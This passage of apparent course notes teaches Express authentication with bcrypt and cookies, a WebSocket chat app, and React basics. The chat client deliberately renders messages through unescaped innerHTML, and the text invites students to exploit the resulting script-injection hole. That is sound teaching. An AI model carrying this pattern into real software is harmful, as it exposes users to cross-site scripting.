To hash our passwords we will use the `bcrypt` package. This creates a very secure one way hash of the password. If you are interested in understanding how [bcrypt](https://en.wikipedia.org/wiki/Bcrypt) works, it is definitely worth the time.

```js
const bcrypt = require('bcrypt');

async function createUser(email, password) {
  // Hash the password before we insert it into the database
  const passwordHash = await bcrypt.hash(password, 10);

  const user = {
    email: email,
    password: passwordHash,
    token: uuid.v4(),
  };
  await collection.insertOne(user);

  return user;
}
```

## Passing authentication tokens

We now need to pass our generated authentication token to the browser when the login endpoint is called, and get it back on subsequent requests. To do this we use HTTP cookies. The `cookie-parser` package provides middleware for cookies and so we will leverage that.

We import the `cookieParser` object and then tell our app to use it. When a user is successfully created, or logs in, we set the cookie header. Since we are storing an authentication token in the cookie we want to make it as secure as possible, and so we use the `httpOnly`, `secure`, and `sameSite` options.

- `httpOnly` tells the browser to not allow JavaScript running on the browser to read the cookie.
- `secure` requires HTTPS to be used when sending the cookie back to the server.
- `sameSite` will only return the cookie to the domain that generated it.

```js
const cookieParser = require('cookie-parser');

// Use the cookie parser middleware
app.use(cookieParser());

apiRouter.post('/auth/create', async (req, res) => {
  if (await DB.getUser(req.body.email)) {
    res.status(409).send({ msg: 'Existing user' });
  } else {
    const user = await DB.createUser(req.body.email, req.body.password);

    // Set the cookie
    setAuthCookie(res, user.token);

    res.send({
      id: user._id,
    });
  }
});

function setAuthCookie(res, authToken) {
  res.cookie('token', authToken, {
    secure: true,
    httpOnly: true,
    sameSite: 'strict',
  });
}
```

## Login endpoint

The login authorization endpoint needs to get the hashed password from the database, compare it to the provided password using `bcrypt.compare`, and if successful set the authentication token in the cookie. If the password does not match, or there is no user with the given email, the endpoint returns status 401 (unauthorized).

```js
app.post('/auth/login', async (req, res) => {
  const user = await getUser(req.body.email);
  if (user) {
    if (await bcrypt.compare(req.body.password, user.password)) {
      setAuthCookie(res, user.token);
      res.send({ id: user._id });
      return;
    }
  }
  res.status(401).send({ msg: 'Unauthorized' });
});
```

## GetMe endpoint

With everything in place to create credentials and login using the credentials, we can now implement the `getMe` endpoint to demonstrate that it all actually works. To implement this we get the user object from the database by querying on the authentication token. If there is not an authentication token, or there is no user with that token, we return status 401 (unauthorized).

```js
app.get('/user/me', async (req, res) => {
  authToken = req.cookies['token'];
  const user = await collection.findOne({ token: authToken });
  if (user) {
    res.send({ email: user.email });
    return;
  }
  res.status(401).send({ msg: 'Unauthorized' });
});
```

## Final code

Here is the full example code.

```js
const { MongoClient } = require('mongodb');
const uuid = require('uuid');
const bcrypt = require('bcrypt');
const cookieParser = require('cookie-parser');
const express = require('express');
const app = express();

const userName = process.env.MONGOUSER;
const password = process.env.MONGOPASSWORD;
const hostname = process.env.MONGOHOSTNAME;

const url = `mongodb+srv://${userName}:${password}@${hostname}`;
const client = new MongoClient(url);
const collection = client.db('authTest').collection('user');

app.use(cookieParser());
app.use(express.json());

// createAuthorization from the given credentials
app.post('/auth/create', async (req, res) => {
  if (await getUser(req.body.email)) {
    res.status(409).send({ msg: 'Existing user' });
  } else {
    const user = await createUser(req.body.email, req.body.password);
    setAuthCookie(res, user.token);
    res.send({
      id: user._id,
    });
  }
});

// loginAuthorization from the given credentials
app.post('/auth/login', async (req, res) => {
  const user = await getUser(req.body.email);
  if (user) {
    if (await bcrypt.compare(req.body.password, user.password)) {
      setAuthCookie(res, user.token);
      res.send({ id: user._id });
      return;
    }
  }
  res.status(401).send({ msg: 'Unauthorized' });
});

// getMe for the currently authenticated user
app.get('/user/me', async (req, res) => {
  authToken = req.cookies['token'];
  const user = await collection.findOne({ token: authToken });
  if (user) {
    res.send({ email: user.email });
    return;
  }
  res.status(401).send({ msg: 'Unauthorized' });
});

function getUser(email) {
  return collection.findOne({ email: email });
}

async function createUser(email, password) {
  const passwordHash = await bcrypt.hash(password, 10);
  const user = {
    email: email,
    password: passwordHash,
    token: uuid.v4(),
  };
  await collection.insertOne(user);

  return user;
}

function setAuthCookie(res, authToken) {
  res.cookie('token', authToken, {
    secure: true,
    httpOnly: true,
    sameSite: 'strict',
  });
}

const port = 8080;
app.listen(port, function () {
  console.log(`Listening on port ${port}`);
});
```

## Experiment

With everything implemented we can use curl to try it out. First start up the web service from VS Code by pressing `F5` and selecting `node.js` as the debugger if you have not already done that. You can set breakpoints on all of the different endpoints to see what they do and inspect the different variables. Then open a console window and run the following curl commands. You should see similar results as what is shown below. Note that the `-c` and `-b` parameters tell curl to store and use cookies with the given file.

```sh
➜  curl -X POST localhost:8080/auth/create -H 'Content-Type:application/json' -d '{"email":"지안@id.com", "password":"toomanysecrets"}'

{"id":"639bb9d644416bf7278dde44"}


➜  curl -c cookie.txt -X POST localhost:8080/auth/login -H 'Content-Type:application/json' -d '{"email":"지안@id.com", "password":"toomanysecrets"}'

{"id":"639bb9d644416bf7278dde44"}


➜  curl -b cookie.txt localhost:8080/user/me

{"email":"지안@id.com"}
```

# WebSocket

![webSocket](webServicesWebSocketsLogo.png)

HTTP is based on a client server architecture. A client always initiates the request and the server responds. This is great if you are building a global document library connected by hyperlinks, but for many other use cases it just doesn't work. Applications for notifications, distributed task processing, peer to peer communication, or asynchronous events need communication that is initiated by two or more connected devices.

For years, web developers created hacks to work around the limitation of the client/server model. This included solutions like having the client frequently pinging the server to see if the server had anything to say, or keeping client initiated connections open for a very long time as the client waited for some event to happen on the server. Needless to say, none of these solutions were elegant or efficient.

Finally, in 2011 the communication protocol WebSocket was created to solve this problem. The core feature of WebSocket is that it is fully duplexed. Meaning that after the initial connection is made from a client, using vanilla HTTP, and then upgraded by the server to a WebSocket connection, the relationship changes to a peer to peer connection where either party can efficiently send data at any time.

![WebSocket Upgrade](webServicesWebSocketUpgrade.jpg)

WebSocket connections are still only between two parties. So if you want to facilitate a conversation between a group of users the server must act as the intermediary. Each peer first connects to the server, and then the server forwards messages amongst the peers.

![WebSocket Peers](webServicesWebSocketPeers.jpg)

## Creating a WebSocket conversation

JavaScript running on a browser can initiate a websocket connection with the browser's WebSocket API. First you create a WebSocket object by specifying the port you want to communicate on.

You can then send messages with the `send` function, and register a callback using the `onmessage` function to receive messages.

```js
const socket = new WebSocket('ws://localhost:9900');

socket.onmessage = (event) => {
  console.log('received: ', event.data);
};

socket.send('I am listening');
```

The server uses the `ws` package to create a WebSocketServer that is listening on the same port the browser is using. By specifying a port when you create the WebSocketServer you are telling the server to listen for HTTP connections on that port and to automatically upgrade them to a WebSocket connection if the request has a `connection: Upgrade` header.

When a connection is detected it calls the server's `on connection` callback. The server can then send messages with the `send` function, and register a callback using the `on message` function to receive messages.

```js
const { WebSocketServer } = require('ws');

const wss = new WebSocketServer({ port: 9900 });

wss.on('connection', (ws) => {
  ws.on('message', (data) => {
    const msg = String.fromCharCode(...data);
    console.log('received: %s', msg);

    ws.send(`I heard you say "${msg}"`);
  });

  ws.send('Hello webSocket');
});
```

In later instruction we will show you how to run and debug this example.

# WebSocket chat

With the understanding of what WebSockets are, the basics of using them from Node and the browser, and the ability to debug the communication, it is time to use WebSocket to build a simple chat application.

![WebSocket Peers](webServicesWebSocketPeers.jpg)

In this example we will create an HTML page that uses WebSockets and displays the resulting chat. The server will forward the WebSocket communication from the different clients.

## Chat client

The HTML for the client provides an input for the user's name, an input for creating messages, and an element to display the messages that are sent and received.

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>WebSocket Chat</title>
    <link rel="stylesheet" href="main.css" />
  </head>
  <body>
    <div class="name">
      <fieldset id="name-controls">
        <legend>My Name</legend>
        <input id="my-name" type="text" />
      </fieldset>
    </div>

    <fieldset id="chat-controls" disabled>
      <legend>Chat</legend>
      <input id="new-msg" type="text" />
      <button onclick="sendMessage()">Send</button>
    </fieldset>
    <div id="chat-text"></div>
  </body>
  <script src="chatClient.js"></script>
</html>
```

The JavaScript for the application provides the interaction with the DOM for creating and displaying messages, and manages the WebSockets in order to connect, send, and receive messages.

### DOM interaction

We do not want to be able to send messages if the user has not specified a name. So we add an event listener on the name input and disable the chat controls if the name ever is empty.

```js
const chatControls = document.querySelector('#chat-controls');
const myName = document.querySelector('#my-name');
myName.addEventListener('keyup', (e) => {
  chatControls.disabled = myName.value === '';
});
```

We then create a function that will update the displayed messages by selecting the element with the `chat-text` ID and appending the new message to its HTML. Security minded developers will realize that manipulating the DOM in this way will allow any chat user execute code in the context of the application. After you get everything working, if you are interested, see if you can exploit this weakness.

```js
function appendMsg(cls, from, msg) {
  const chatText = document.querySelector('#chat-text');
  chatText.innerHTML = `<div><span class="${cls}">${from}</span>: ${msg}</div>` + chatText.innerHTML;
}
```

When a user presses the enter key in the message input we want to send the message over the socket. We do this by selecting the DOM element with the `new-msg` ID and adding a listener that watches for the `Enter` keystroke.

```js
const input = document.querySelector('#new-msg');
input.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    sendMessage();
  }
});
```

When Enter is pressed the sendMessage function is called. This selects the text out of the `new-msg` element and the name out of the `my-name` element and sends that over the WebSocket. The value of the message element is then cleared so that it is ready for the next message.

```js
function sendMessage() {
  const msgEl = document.querySelector('#new-msg');
  const msg = msgEl.value;
  if (!!msg) {
    appendMsg('me', 'me', msg);
    const name = document.querySelector('#my-name').value;
    socket.send(`{"name":"${name}", "msg":"${msg}"}`);
    msgEl.value = '';
  }
}
```

### WebSocket connection

Now we can set up our WebSocket. We want to be able to support both secure and non-secure WebSocket connections. To do this we look at the protocol that is currently being used as represented by the `window.location.protocol` variable. If it is non-secure HTTP then we set our WebSocket protocol to be non-secure WebSocket (`ws`). Otherwise we use secure WebSocket (`wss`). We use that to then connect the WebSocket to the same location that we loaded the HTML from by referencing the `window.location.host` variable.

We can notify the user that chat is ready to go by listening to the `onopen` event and appending some text to the display using the `appendMsg` function we created earlier.

```js
// Adjust the webSocket protocol to what is being used for HTTP
const protocol = window.location.protocol === 'http:' ? 'ws' : 'wss';
const socket = new WebSocket(`${protocol}://${window.location.host}/ws`);

// Display that we have opened the webSocket
socket.onopen = (event) => {
  appendMsg('system', 'websocket', 'connected');
};
```

When the WebSocket receives a message from a peer it displays it using the `appendMsg` function.

```js
socket.onmessage = async (event) => {
  const text = await event.data.text();
  const chat = JSON.parse(text);
  appendMsg('friend', chat.name, chat.msg);
};
```

And if the WebSocket closes for any reason we also display that to the user and disable the controls.

```js
socket.onclose = (event) => {
  appendMsg('system', 'websocket', 'disconnected');
  document.querySelector('#name-controls').disabled = true;
  document.querySelector('#chat-controls').disabled = true;
};
```

## Chat server

The chat server runs the web service, serves up the client code, manages the WebSocket connections, and forwards messages from the peers.

### Web service

The web service is established using a simple Express application. Note that we serve up our client HTML, CSS, and JavaScript files using the `static` middleware.

```js
const { WebSocketServer } = require('ws');
const express = require('express');
const app = express();

// Serve up our webSocket client HTML
app.use(express.static('./public'));

const port = process.argv.length > 2 ? process.argv[2] : 3000;
server = app.listen(port, () => {
  console.log(`Listening on ${port}`);
});
```

### WebSocket server

When we create our WebSocket we do things a little differently than we did with the simple connection example. Instead of letting the WebSocketServer control both the HTTP connection and the upgrading to WebSocket, we want to use the HTTP connection that Express is providing and handle the upgrade to WebSocket ourselves. This is done by specifying the `noServer` option when creating the WebSocketServer and then handling the `upgrade` notification that occurs when a client requests the upgrade of the protocol from HTTP to WebSocket.

```js
// Create a websocket object
const wss = new WebSocketServer({ noServer: true });

// Handle the protocol upgrade from HTTP to WebSocket
server.on('upgrade', (request, socket, head) => {
  wss.handleUpgrade(request, socket, head, function done(ws) {
    wss.emit('connection', ws, request);
  });
});
```

### Forwarding messages

With the WebSocket server we can use the `connection`, `message`, and `close` events to forward messages between peers. On connection we insert an object representing the connection into a list of all connections from the chat peers. Then when a message is received we loop through the peer connections and forward it on to everyone except the peer who initiated the request. Finally we remove a connection from the peer connection list when it is closed.

```js
// Keep track of all the connections so we can forward messages
let connections = [];

wss.on('connection', (ws) => {
  const connection = { id: connections.length + 1, alive: true, ws: ws };
  connections.push(connection);

  // Forward messages to everyone except the sender
  ws.on('message', function message(data) {
    connections.forEach((c) => {
      if (c.id !== connection.id) {
        c.ws.send(data);
      }
    });
  });

  // Remove the closed connection so we don't try to forward anymore
  ws.on('close', () => {
    connections.findIndex((o, i) => {
      if (o.id === connection.id) {
        connections.splice(i, 1);
        return true;
      }
    });
  });
});
```

### Keeping connections alive

A WebSocket connection will eventually close automatically if no data is sent across it. In order to prevent that from happening the WebSocket protocol supports the ability to send a `ping` message to see if the peer is still there and receive `pong` responses to indicate the affirmative.

It make this work we use `setInterval` to send out a ping every 10 seconds to each of our peer connections and clean up any connections that did not response to our previous ping.

```js
setInterval(() => {
  connections.forEach((c) => {
    // Kill any connection that didn't respond to the ping last time
    if (!c.alive) {
      c.ws.terminate();
    } else {
      c.alive = false;
      c.ws.ping();
    }
  });
}, 10000);
```

In our `connection` handler we listen for the `pong` response and mark the connection as alive.

```js
// Respond to pong messages by marking the connection alive
ws.on('pong', () => {
  connection.alive = true;
});
```

Any connection that did not response will remain in the not alive state and get cleaned up on the next pass.

Web frameworks seek to make the job of writing web applications easier by providing tools for completing common application tasks. This includes things like modularizing code, creating single page applications, simplifying reactivity, and supporting diverse hardware devices.

Some frameworks take things beyond the standard web technologies (HTML, CSS, JavaScript) and create new hybrid file formats that combine things like HTML and JavaScript into a single file. Examples of this include React JSX, Vue SFC, and Svelte files. Abstracting away the core web file formats puts the focus on functional components rather than files.

There are lots of web frameworks to choose from and they evolve all the time. You can view the latest popularity poll at [StateOfJS](https://stateofjs.com).

![web frameworks](stateofjs-webframeworks.jpg)

\- **Source**: _StateOfJS web framework poll_

Each framework has advantages and disadvantages. Some are very perscriptive (opinionated) about how to do things, some have major institutional backing, others have a strong open source community. Other factors you want to consider include how easy it is to learn, how it impacts productivity, how performant it is, how long it takes to build, and how actively the framework is evolving.

React was created by Jordan Walke for use at FaceBook in 2011. It was first used with FaceBook's news feed and then as the main framework for Instagram. Shortly thereafter, FaceBook open sourced the framework and it was quickly adopted by many popular web applications.

React abstracts HTML into a JavaScript variate called [JSX](https://reactjs.org/docs/introducing-jsx.html). JSX is converted into valid HTML and JavaScript using a preprocessor called [Babel](https://babeljs.io/). For example, the following is a JSX file. Notice that it mixes both HTML and JavaScript into a single representation.

```jsx
const i = 3;
const list = (
  <ol class='big'>
    <li>Item {i}</li>
    <li>Item {3 + i}</li>
  </ol>
);
```

Babel will convert that into valid JavaScript:

```js
const i = 3;
const list = React.createElement(
  'ol',
  { class: 'big' },
  React.createElement('li', null, 'Item ', i),
  React.createElement('li', null, 'Item ', 3 + i)
);
```

The `React.createElement` function will then generate DOM elements and monitor the data they represent for changes. When a change is discovered React will trigger dependent changes.

## The render function

One of the primary purposes of a component is to generate user interface. This is done with the components `render` function. Whatever is returned from the render function is inserted into the component HTML element.

As a simple example, a JSX file containing a React component element named `Demo` would cause React to load the `Demo` component, call the render function, and insert the result into the place of the `Demo` element.

**JSX**

```jsx
<div>
  Component: <Demo />
</div>
```

Notice that `Demo` is not a valid HTML element. The transpiler will replace this tag with the resulting rendered HTML.

**React component**

```js
function Demo() {
  const who = 'world';
  return <b>Hello {who}</b>;
}
```

**Resulting HTML**

```html
<div>Component: <b>Hello world</b></p>
```

## Properties

React components also allow you to pass information to them in the form of element properties. The component receives the properties in its constructor and then can display them when it renders.

**JSX**

```jsx
<div>Component: <Demo who="Walke" /><div>
```

**React component**

```jsx
function Demo(props) {
  return <b>Hello {props.who}</b>;
}
```

**Resulting HTML**

```html
<div>Component: <b>Hello Walke</b></div>
```

## State

In addition to properties, a component can have internal state. Component state is created by calling the `React.useState` hook function. The useState function returns a variable that contains the current state and a function to update the state. The following example creates a state variable called `clicked` and toggles the click state in the `updateClicked` function that gets called when the paragraph text is clicked.

```jsx
const Clicker = () => {
  const [clicked, updateClicked] = React.useState(false);

  const onClicked = (e) => {
    updateClicked(!clicked);
  };

  return <p onClick={(e) => onClicked(e)}>clicked: {`${clicked}`}</p>;
};

const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(<Clicker />);
```

You should note that you can use JSX even without a function. A simple variable representing JSX will work anyplace you would otherwise provide a component.

```jsx
const hello = <div>Hello</div>;

ReactDOM.render(hello, document.getElementById('root'));
```

## Class style components

In addition to the preferred `function style` components demonstrated above, React also supports `class style` components. However, you should note that the React team is moving away from the class style representation, and for that reason you should probably not use it. With that said, you are likely to see class style components and so you should be aware of the syntax. Below is the equivalent class style component for the Clicker component that we created above.

The major difference is that properties are loaded on the constructor and state is set using a `setState` function on the component object.

```jsx
class Clicker extends React.Component {
  constructor(props) {
    super(props);
    this.state = {
      clicked: false,
    };
  }
  onClicked() {
    this.setState({
      clicked: !this.state.clicked,
    });
  }
  render() {
    return <p onClick={(e) => this.onClicked(e)}>clicked: {`${this.state.clicked}`}</p>;
  }
}

const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(<Clicker />);
```

## Reactivity

A component's properties and state are used by the React framework to determine the reactivity of the interface. Reactivity controls how a component reacts to actions taken by the user or events that happen within the application. Whenever a component's state or properties change, the render function for the component and all of its dependent component render functions are called.

# Reactivity

Making the UI react to changes in user input or data, is one of the architectural foundations of React. React enables reactivity with three major pieces of a React component: `props`, `state`, and `render`.

When a component's JSX is rendered, React parses the JSX and creates a list of any references to the component's `state` or `prop` objects. React then monitors those objects and if it detects that they have changed it will call the component's `render` function so that the impact of the change is visualized.

The following example contains two components. A parent Survey component and a child Question component. The Survey has a state named `color`. The Question has a property named `color`. The Survey passes its `color` state to the Question as a property. This means that any change to the Survey's color will also be reflected in the Question's color. This is a powerful means for a parent to control a child's functionality.

The Question component also has a state named `answer`. The value of answer is displayed as part of the Question's content. The user can interact with this state through HTML radio input elements. When one of the inputs is changed the Question's `onChange` function is called and the answer state is updated to reflect the user's choice. This automatically causes the display of the answer to be updated.

Be careful about your assumptions of when state is updated. Just because you called `updateState` does not mean that you can access the updated state on the next line of code. The update happens asynchronously, and therefore you never really know when it is going to happen, you only know that it will eventually happen.

```jsx
// The Survey component
const Survey = () => {
  const [color, updateColor] = React.useState('#737AB0');

  // When the color changes update the state
  const onChange = (e) => {
    updateColor(e.target.value);
  };
  return (
    <div>
      <h1>Survey</h1>
      {/* Pass the Survey color state as a property to the Question.
          When to color changes the Question property will also be updated and rendered. */}
      <Question color={color} />

      <p>
        <span>Pick a color: </span>
        {/* Pass the Survey color state as a property to the input element.
            When to color changes, the input property will also be updated and rendered. */}
        <input type='color' onChange={(e) => onChange(e)} value={color} />
      </p>
    </div>
  );
};

// The Question component
const Question = ({ color }) => {
  const [answer, updateAnswer] = React.useState('pending...');

  function onChange({ target }) {
    updateAnswer(target.value);
  }

  return (
    <div>
      <span>Do you like this</span>
      {/* Color rerendered whenever the property changes */}
      <span style={{ color: color }}> color</span>?
      <label>
        <input type='radio' name='answer' value='yes' onChange={(e) => onChange(e)} />
        Yes
      </label>
      <label>
        <input type='radio' name='answer' value='no' onChange={(e) => onChange(e)} />
        No
      </label>
      {/* Answer rerendered whenever the state changes */}
      <p>Your answer: {answer}</p>
    </div>
  );
};

ReactDOM.render(<Survey />, document.getElementById('root'));

React hooks allow React function style components to be able to do everything that a class style component can do and more. Additionally, as new features are added to React they are including them as hooks. This makes function style components the preferred way of doing things in React. You have already see one use of hooks to declare and update state in a function component with the `useState` hook.

```jsx
function Clicker({ initialCount }) {
  const [count, updateCount] = React.useState(initialCount);
  return <div onClick={() => updateCount(count + 1)}>Click count: {count}</div>;
}

ReactDOM.render(<Clicker initialCount={3} />, document.getElementById('root'));
```

## useEffect hook

The `useEffect` hook allows you to represent lifecycle events. For example, if you want to run a function every time the component completes rendering, you could do the following.

```jsx
function UseEffectHookDemo() {
  React.useEffect(() => {
    console.log('rendered');
  });

  return <div>useEffectExample</div>;
}

ReactDOM.render(<UseEffectHookDemo />, document.getElementById('root'));
```

You can also take action when the component cleans up by returning a cleanup function from the function registered with `useEffect`. In the following example, every time the component is clicked the state changes and so the component is rerendered. This causes both the cleanup function to be called in addition to the hook function. If the function was not rerendered then only the cleanup function would be called.

```jsx
function UseEffectHookDemo() {
  const [count, updateCount] = React.useState(0);
  React.useEffect(() => {
    console.log('rendered');

    return function cleanup() {
      console.log('cleanup');
    };
  });

  return <div onClick={() => updateCount(count + 1)}>useEffectExample {count}</div>;
}

ReactDOM.render(<UseEffectHookDemo />, document.getElementById('root'));
```

This is useful when you want to create side effects for things such as tracking when a component is displayed or hidden, or creating and disposing of resources.

## Hook dependencies

You can control what triggers a `useEffect` hook by specifying its dependencies. In the following example we have two state variables, but we only want the `useEffect` hook to be called when the component is initially called and when the first variable is clicked. To accomplish this you pass an array of dependencies as a second parameter to the `useEffect` call.

```jsx
function UseEffectHookDemo() {
  const [count1, updateCount1] = React.useState(0);
  const [count2, updateCount2] = React.useState(0);

  React.useEffect(() => {
    console.log(`count1 effect triggered ${count1}`);
  }, [count1]);

  return (
    <ol>
      <li onClick={() => updateCount1(count1 + 1)}>Item 1 - {count1}</li>
      <li onClick={() => updateCount2(count2 + 1)}>Item 2 - {count2}</li>
    </ol>
  );
}

ReactDOM.render(<UseEffectHookDemo />, document.getElementById('root'));
```

If you specify and empty array `[]` as the hook dependency then it is only called when the component is first rendered.

Note that hooks can only be used in function style components and must be called at the top scope of the function. That means a hook cannot be called inside of a loop or conditional. This restriction ensures that hooks are always called in the same order when a component is rendered.

# Toolchains

As web programming becomes more and more complex it became necessary to abstract away some of that complexity with a series of tools. Some common functional pieces in a web application chain include:

- **Code repository** - Stores code in a shared, versioned, location.
- **Linter** - Removes, or warns, of non-idiomatic code usage.
- **Prettier** - Formats code according to a shared standard.
- **Transpiler** - Compiles code into a different format. For example, from JSX to JavaScript.
- **Polyfill** - Generates backward compatible code for supporting old browser versions that do not support the latest standards.
- **Bundler** - Packages code into bundles for delivery to the browser. This enables compatibility (for example with ES6 module support), or performance (with lazy loading).
- **Minifier** - Removes whitespace and renames variables in order to make code smaller and more efficient to deploy.
- **Testing** - Automated tests at multiple levels to ensure correctness.
- **Deployment** - Automated packaging and delivery of code from the development environment to the production environment.

The toolchain that we use for our React project consists of [GitHub](https://github.com/) as the code repository, [Babel](https://babeljs.io/docs/en/) for transpiling, [WebPack](https://webpack.js.org/) for polyfill, bundling, and minifying, and finally a simple bash script (deployReact.sh) for deployment.

You don't have to fully understand what each of these pieces in the chain are accomplishing, but the more you know about them the more you can optimize your development efforts.

Now that we have covered the basics of React, we want to extend our usage to include a full web framework toolchain that allows us to use JSX, minification, polyfills, and bundling for our Simon and startup applications. One common way for configuring your project to take advantage of these technologies is to use a Command Line Interface (CLI) to initially set up a React based project.

A CLI is a program that runs from the console and usually provides an assortment of commands related to some specific purpose. For example, the [AWS CLI](https://aws.amazon.com/cli/) allows you to interact with all of its services. This saves you the time of having to bring up the AWS website interface when you want to use an AWS service. Instead of opening a browser, logging in, navigating to a service, and walking through a bunch of UI dialogs, you simply open your console window and use the AWS CLI to execute a single command.

To set up our React toolchain we will use the `create-react-app` CLI. This CLI will create and configure a template React application that you can use as a starting place for your application. `create-react-app` is an NPM package that works as a console program. Previously you used npm packages to add code libraries to your applications, but you can also run NPM packages as if they were a console program, if they are [configured](https://blog.npmjs.org/post/118810260230/building-a-simple-command-line-tool-with-npm.html) to do so.

The common way to run CLI NPM programs is to use the `NPX` program that was included when you installed NPM. NPX will temporarily download the desired package from NPM and then execute it using Node. Basically, NPX is just a short cut for `NPM install` and `NPM start`. It also has the advantage of not actually persistently installing the package and so it doesn't leave any clutter behind in your development environment.

When you run `create-react-app` with NPX, it creates a brand new React application project based on a standard template. You can see how this works by running the following from your console window. Make sure you are in a directory where you keep your coding projects. For example, `cd ~/src/byu/cs260`.

```sh
npx create-react-app test-react
```

When this runs it will create a project directory named `test-react`, create a bunch of project template files, and install the NPM packages necessary to use React and the associated toolchain. You can examine the project it created by changing into the `test-react` directory and opening VS Code.

```sh
cd test-react
code .
```

Before we look at what the generated project contains, let's run the application and see what it does. From the `test-react` directory run `npm start`.

```sh
➜  npm start

Compiled successfully!

You can now view test-react in the browser.

  Local:            http://localhost:3000
```

This should automatically launch the application and open your browser to display the application running on port 3000.

![React CLI Application](reactCliApp.png)

To stop the application, use the `CTRL-C` (kill) keystroke in the console window where you started it.

Congratulations you have just used a CLI to create a React based web application. Time for cookies.

## Generated project

Let's examine the file and directory structure that `create-react-app` created.

| Directory | File               | Purpose                                                      |
| --------- | ------------------ | ------------------------------------------------------------ |
| ./        | .gitignore         | Specifies files to not include in your Git commits           |
|           | package-json       | NPM definition for included packages and script commands     |
|           | package-lock.json  | Version constraints for included packages (do not edit this) |
|           | README.md          | GitHub readme for the project                                |
| ./public  | index.html         | Primary page for the application                             |
|           | favicon.ico        | Primary application icon                                     |
|           | logo\*.png         | Icons used for mobile devices                                |
|           | manifest.json      | Configuration for use on mobile devices (PWA support)        |
|           | robots.txt         | Directives for search engine crawlers like Google            |
| ./src     | index.js           | Entry point for code execution                               |
|           | index.css          | CSS for top level component                                  |
|           | App.css            | CSS for the main application component                       |
|           | App.js             | JavaScript for the main application component                |
|           | App.test.js        | Automated tests for the main application component           |
|           | logo.svg           | Image displayed in the main application component            |
|           | reportWebVitals.js | Configuration for reporting application performance          |
|           | setupTests.js      | Set up for automated tests                                   |

At a high level `create-react-app` did the following:

1. Updated `./package-json` to include the necessary NPM packages for running and testing a React application.
1. Created `./public/index.html` as the entry point for the browser to load your application
1. Created `./src/index.js` to initialize the React application
1. Created `./src/app.js` to provide the top level React component

All the other files provide styling, use on mobile devices, testing, and performance monitoring.

## Digging into the generated code

When the browser requests to load your application it gets `index.html` by default. `index.html` contains the basic metadata for the application, but the actual content is injected into the HTML, at runtime, based upon the code contained in `index.js`. This happens because React by default will look for a file named `index.js` and execute it. The `index.js` file contains code that looks for a `div` element named `root` and renders the App component into that div. This causes the `App` component to be loaded from `App.js` which finally provides the content that you see visualized in the browser.

![React flow](reactCliFlow.png)

From this basic template code, you can build your application by replacing the App component, adding new React child components to the App component, and introducing a React router.

## What the toolchain is doing

When you run `npm start` it executes the `start` script found in `package.json`.

```json
  "scripts": {
    "start": "react-scripts start",
    "build": "react-scripts build",
  }
```

This runs another NPM CLI package called `react-scripts` and tells it to build the application from the code and launch it with a development HTTP server similar to the Live Server extension you have been using in VS Code. `react-scripts` then launches your browser and points it to `localhost:3000` where you can see the application rendering. Note that the development HTTP server will monitor changes to the application source and automatically rebuild it. Try this out by starting the application, editing the `App.js` file to contain something different, saving it, and looking at the browser window displaying the application.

![React CLI reload](reactCliReload.gif)

When `react-scripts` builds the application it converts the React JSX files to valid JavaScript and populates the `index.html` file with references to the generated files. If you look at `index.html` in your project, you will see that it contains a fairly bare bones HTML page.

**Template version of index.html**

```html
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <link rel="icon" href="%PUBLIC_URL%/favicon.ico" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="theme-color" content="#000000" />
    <meta name="description" content="Web site created using create-react-app" />
    <link rel="apple-touch-icon" href="%PUBLIC_URL%/logo192.png" />
    <link rel="manifest" href="%PUBLIC_URL%/manifest.json" />
    <title>React App</title>
  </head>
  <body>
    <div id="root"></div>
  </body>
</html>
```

If you start the application, and use the browser's debugger to look at the actual HTML loaded into the DOM you will see the result of the toolchain manipulation and bundling. (Note that this code has been abbreviated for clarity of the example.) Our `index.html` file now has injected file paths, JavaScript for running the React web framework in the browser, CSS elements for the currently rendered components, and the transpiled component HTML from the React components.

**DOM version of index.html**

```html
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <!-- path for public files in injected -->
    <link rel="icon" href="/favicon.ico" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="theme-color" content="#000000" />
    <meta name="description" content="Web site created using create-react-app" />
    <link rel="apple-touch-icon" href="/logo192.png" />
    <link rel="manifest" href="/manifest.json" />
    <title>React App</title>
    <!-- The minified JavaScript for using React as the web framework -->
    <script defer="" src="/static/js/bundle.js"></script>
    <!-- CSS styles are inserted from the component CSS. -->
    <style>
      body {
        margin: 0;
        font-family: 'Roboto', 'Oxygen', 'Ubuntu', sans-serif;
      }
      .App {
        text-align: center;
      }
    </style>
  </head>
  <body>
    <!-- Root application JSX transpiled and inserted -->
    <div id="root">
      <!-- Application component JSX transpiled and inserted -->
      <div class="App">
        <header class="App-header">
          <img src="/static/media/logo.6ce24c58023cc2f8fd88fe9d219db6c6.svg" class="App-logo" alt="logo" />
          <p>Edit <code>src/App.js</code> and save to reload.</p>
          <a class="App-link" href="https://reactjs.org" target="_blank" rel="noopener noreferrer">Learn React</a>
        </header>
      </div>
    </div>
  </body>
</html>
```

## Modifying the generated project

There is nothing that `create-react-app` does that you should consider off limits for change or improvement. If you take the time to understand what it is doing and why, then you should feel free to customize the application to how you would like it to work. At a basic level you should always do the following:

1. Replace the icon files with your own icons
1. Modify the manifest.json and package.json to contain your application name
1. Modify the README.md to describe your application
1. Modify index.html to contain a proper title and description metadata.

### Removing testing and performance monitoring

As an example of more extension modifications, we can remove the testing and performance packages that `create-react-app` included in the template. You might do this because you are trying to simplify the project for demonstration purposes, or because you want to replace it with a different testing framework such as Playwright.

To make this change, we first use NPM to **uninstall** the `@testing-library` packages. This removes the packages from `package.json` so that they are no longer installed in `node_modules` when you run `npm install`.

```sh
npm uninstall @testing-library/jest-dom @testing-library/react @testing-library/user-event
```

Next delete the test JavaScript files `setupTest.js` and `App.test.js`. With the testing packages gone, nothing will call this code and so we can simply delete it.

```sh
rm src/setupTests.js src/App.test.js
```

We can also remove the performance reporting package and code in order to simplify our application even further.

```sh
npm uninstall web-vitals
rm src/reportWebVitals.js
```

Finally, we remove the references to `reportWebVitals` from `index.js` since that package is no longer available.

**index.js**

```js
import React from 'react';
import ReactDOM from 'react-dom/client';
import './index.css';
